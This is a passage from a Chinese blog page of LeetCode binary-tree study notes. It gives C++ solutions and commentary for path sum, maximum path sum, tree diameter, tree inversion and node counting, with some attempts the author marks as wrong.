class="number">0</span>)</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="built_in">dfs</span>(root-&gt;left,targetSum);</span><br><span class="line"><span class="built_in">dfs</span>(root-&gt;right,targetSum);</span><br><span class="line">path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line"><span class="comment">//&#125; </span></span><br><span class="line"><span class="comment">//错误</span></span><br><span class="line"><span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span> &amp;&amp; targetSum==<span class="number">0</span>)</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left,targetSum);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right,targetSum);</span><br><span class="line">    path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    上道题已经可以获取到 满足条件的叶节点，本题重点是获取 该叶节点的完整路径</span></span><br><span class="line"><span class="comment">    可以写一个函数获取getPath()</span></span><br><span class="line"><span class="comment">    vector&lt;vector&lt;int&gt;&gt; res;</span></span><br><span class="line"><span class="comment">    unordered_map&lt;TreeNode*, TreeNode*&gt; parent;//记录每个结点的父节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    unordered_map&lt;TreeNode*, TreeNode*&gt; parent;<span class="comment">//记录每个结点的父节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getPath</span><span class="params">(TreeNode *node)</span></span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="keyword">while</span>(node)&#123;</span><br><span class="line">            tmp.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            node = parent[node];<span class="comment">//从叶节点向上遍历，一直到根节点，得到完整的路径</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(tmp.<span class="built_in">begin</span>(),tmp.<span class="built_in">end</span>());<span class="comment">//逆序</span></span><br><span class="line">        res.<span class="built_in">push_back</span>(tmp);<span class="comment">//添加到结果集中</span></span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">pathSum</span>(TreeNode* root, <span class="keyword">int</span> targetSum) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)   </span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode*&gt; q_node;</span><br><span class="line">        queue&lt;<span class="keyword">int</span>&gt; q_val;</span><br><span class="line">        q_node.<span class="built_in">push</span>(root);</span><br><span class="line">        q_val.<span class="built_in">push</span>(root-&gt;val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q_node.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node = q_node.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">int</span> tmp = q_val.<span class="built_in">front</span>();</span><br><span class="line">            q_node.<span class="built_in">pop</span>();</span><br><span class="line">            q_val.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left==<span class="literal">nullptr</span>&amp;&amp;node-&gt;right==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp==targetSum)&#123;</span><br><span class="line">                    <span class="built_in">getPath</span>(node);<span class="comment">//若该叶节点 符合条件，则调用getPath函数获取完整路径</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left)&#123;</span><br><span class="line">                parent[node-&gt;left] = node;<span class="comment">//重点！！！！</span></span><br><span class="line">                q_node.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                q_val.<span class="built_in">push</span>(node-&gt;left-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right)&#123;</span><br><span class="line">                parent[node-&gt;right] = node;<span class="comment">//重点！！！！</span></span><br><span class="line">                q_node.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                q_val.<span class="built_in">push</span>(node-&gt;right-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="437-路径总和-III"><a href="#437-路径总和-III" class="headerlink" title="437 路径总和 III"></a>437 路径总和 III</h2><p>给定一个二叉树的根节点 root ，和一个整数 targetSum ，求该二叉树里节点值之和等于 targetSum 的 路径 的 【数目】。<br><strong>路径</strong>: <code>不需要从根节点开始</code>，<code>也不需要在叶子节点结束</code>，但是路径方向<code>必须是向下</code>的（只能从父节点到子节点）。</p><p><strong>路径方向是向下的！！！！</strong></p><p><strong>分析：</strong><br>穷举所有可能，访问每一个节点 node，检测以 node 为起始节点且<code>向下</code>延深的路径有多少种。我们<code>递归遍历</code>每一个节点的所有可能的路径，然后将这些<code>路径数目加起来</code>即为返回结果。</p><p>定义 rootSum(p,val) 表示以节点 p 为起点向下且满足路径总和为 val 的路径数目。我们对二叉树上每个节点 p 求出 rootSum(p,targetSum)，然后对这些路径数目求和即为返回结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    时间复杂度：O(N^2)，其中 N 为该二叉树节点的个数。对于每一个节点，求以该节点为起点的路径数目时，则需要遍历以该节点为根节点的子树的所有节点，因此求该路径所花费的最大时间为 O(N)，我们会对每个节点都求一次以该节点为起点的路径数目。</span></span><br><span class="line"><span class="comment">    空间复杂度：O(N)，考虑到递归需要在栈上开辟空间。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//以某个起点开始 满足条件的路径 数目</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rootSum</span><span class="params">(TreeNode *root, <span class="keyword">long</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resNums = <span class="number">0</span>;<span class="comment">//符合条件targetSum路径数目</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val==targetSum)</span><br><span class="line">            resNums++;</span><br><span class="line">        resNums += <span class="built_in">rootSum</span>(root-&gt;left,targetSum-root-&gt;val);</span><br><span class="line">        resNums += <span class="built_in">rootSum</span>(root-&gt;right,targetSum-root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> resNums;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="built_in">rootSum</span>(root,targetSum);<span class="comment">//以根节点为起点 的路径数目</span></span><br><span class="line">        res += <span class="built_in">pathSum</span>(root-&gt;left,targetSum);<span class="comment">//以 左子树 为起点 的路径数目</span></span><br><span class="line">        res += <span class="built_in">pathSum</span>(root-&gt;right,targetSum);<span class="comment">//以 右子树 为起点 的路径数目</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>定义【节点前缀和】为：由根结点到当前结点的路径上所有节点的和。我们利用先序遍历二叉树，记录下根节点 root到当前节点 p 的路径上除当前节点以外所有节点的前缀和，在已保存的路径前缀和中查找是否存在前缀和刚好等于当前节点到根节点的前缀和 cur 减去 targetSum</p><p>假设当前从根节点 root 到节点 node 的前缀和为 curr，则此时我们在已保存的前缀和查找是否存在前缀和刚好等于 curr−targetSum。假设从根节点 root 到节点 node的路径中存在节点 pi​ 到根节点 root的前缀和为 curr−targetSum，则节点 pi+1​ 到 node 的路径上所有节点的和一定为 targetSum。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    O(N)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">long</span> <span class="keyword">long</span>,<span class="keyword">int</span>&gt; maap;<span class="comment">//第一个数表示【路径】，第二个数表示该路径的 【存在条数】</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(TreeNode *root,<span class="keyword">long</span> <span class="keyword">long</span> cur,<span class="keyword">int</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        cur += root-&gt;val;<span class="comment">//前缀和</span></span><br><span class="line">        <span class="keyword">if</span>(maap.<span class="built_in">count</span>(cur-targetSum))</span><br><span class="line">            res = maap[cur-targetSum];<span class="comment">//找满足条件的 条数cur-targetSum存在，则 res加上 存的条数</span></span><br><span class="line">        maap[cur]++;<span class="comment">//从根节点到本结点 路径和是 cur 的条数</span></span><br><span class="line">        res += <span class="built_in">dfs</span>(root-&gt;left,cur,targetSum);</span><br><span class="line">        res += <span class="built_in">dfs</span>(root-&gt;right,cur,targetSum);</span><br><span class="line">        maap[cur]--;<span class="comment">//回溯！！！！！！！！前缀和 回退</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        maap[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//空路径0 的条数 1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dfs</span>(root,<span class="number">0</span>,targetSum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124 二叉树中的最大路径和"></a>124 二叉树中的最大路径和</h2><p>二叉树中的【路径】被定义为一条节点序列，序列中每对相邻节点之间都存在一条边。同一个节点在一条路径序列中 至多出现一次 。该路径 至少包含一个 节点，且不一定经过根节点。<br>路径和 是路径中各节点值的总和。<br>给你一个二叉树的根节点 root ，返回其 最大路径和。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最大路径和</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    O(N)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> maxSum = INT_MIN;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxPath</span><span class="params">(TreeNode *root)</span></span>&#123;<span class="comment">//以某结点为 根结点 ，找一条路径结点值和最大 的路径</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//int left = maxPath(root-&gt;left);这两句 不对</span></span><br><span class="line">        <span class="comment">//int right = maxPath(root-&gt;right);</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="built_in">max</span>(<span class="built_in">maxPath</span>(root-&gt;left),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> right = <span class="built_in">max</span>(<span class="built_in">maxPath</span>(root-&gt;right),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> maxPath = left+right+root-&gt;val;</span><br><span class="line">        <span class="comment">//更新</span></span><br><span class="line">        maxSum = <span class="built_in">max</span>(maxSum,maxPath);   <span class="comment">//最大路径和</span></span><br><span class="line">        <span class="keyword">return</span> root-&gt;val+<span class="built_in">max</span>(left,right);<span class="comment">//这句和上句不同：该句返回的是——对该结点来说，向下的路径有两条，向左走和向右走，返回val+max(left,right)就是 在返回路径最大的那条</span></span><br><span class="line">        <span class="comment">//return max(root-&gt;val,(root-&gt;val+max(left,right)));不对</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">maxPath</span>(root);</span><br><span class="line">        <span class="keyword">return</span> maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最大直径——比较学习</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//全局遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">depth</span><span class="params">(TreeNode* root)</span></span>&#123;<span class="comment">//某棵树的最大深度</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//int left_max = depth(root-&gt;left);</span></span><br><span class="line">        <span class="comment">//int right_max = depth(root-&gt;right);</span></span><br><span class="line">        <span class="keyword">int</span> left_max = <span class="built_in">max</span>(<span class="built_in">depth</span>(root-&gt;left),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> right_max = <span class="built_in">max</span>(<span class="built_in">depth</span>(root-&gt;right),<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//更新：最大直径</span></span><br><span class="line">        res = <span class="built_in">max</span>(res,left_max+right_max);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(left_max,right_max)+<span class="number">1</span>;<span class="comment">//这句和上句不同，返回val+max(left,right)就是 在返回高度最大的那条</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> root_max = <span class="built_in">depth</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="226-翻转二叉树-转换为其【镜像】"><a href="#226-翻转二叉树-转换为其【镜像】" class="headerlink" title="226 翻转二叉树-转换为其【镜像】"></a>226 翻转二叉树-转换为其【镜像】</h3><p><strong>这道题目使用前序遍历和后序遍历都可以，唯独中序遍历不方便，因为中序遍历会把某些节点的左右孩子翻转了两次！</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归    【交换左右孩子】</span></span><br><span class="line"><span class="comment">    时间复杂度：O(N)    空间复杂度：O(N)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode *left =  <span class="built_in">invertTree</span>(root-&gt;left);</span><br><span class="line">        TreeNode *right =  <span class="built_in">invertTree</span>(root-&gt;right);</span><br><span class="line">        root-&gt;left = right;</span><br><span class="line">        root-&gt;right = left;<span class="comment">//这两句相当于交换 左右孩子</span></span><br><span class="line">        <span class="comment">//swap(root-&gt;left,root-&gt;right);</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代——深度优先遍历</span></span><br><span class="line"><span class="comment">    前序遍历——迭代法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; stk;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            stk.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="built_in">swap</span>(node-&gt;left,node-&gt;right);<span class="comment">//关键：与前序遍历的区别</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">                stk.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">                stk.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代——广度优先遍历</span></span><br><span class="line"><span class="comment">    层序遍历</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">swap</span>(node-&gt;left, node-&gt;right); <span class="comment">// 节点处理</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="222-完全二叉树的节点个数"><a href="#222-完全二叉树的节点个数" class="headerlink" title="222 完全二叉树的节点个数"></a>222 完全二叉树的节点个数</h3><p>想到【两个思路】：</p><ul><li>层序遍历：看看是几层，由于是完全二叉树，直到层数即知道结点树<ul><li>2^h-1</li></ul></li><li>各种遍历方法，每遍历一个结点，个数+1</li></ul><p><strong>如果想判断 是 完全二叉树还是 满二叉树：两个指针，沿着左子树和沿着右子树 两个方向遍历次数是否相同</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//想到了 如果是满二叉树的话，可以很简便，直接循着左子树找深度即可，因为完全二叉树最后一行的空结点 只会出现在右边开始</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            h++;<span class="comment">//深度</span></span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">2</span>,h)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归-</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">order</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        int left = order(root-&gt;left);</span></span><br><span class="line"><span class="comment">        int right = order(root-&gt;right);</span></span><br><span class="line"><span class="comment">        return left+right+1;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">order</span>(root-&gt;left) + <span class="built_in">order</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">order</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    层序遍历：队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//这里是直接计数</span></span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span 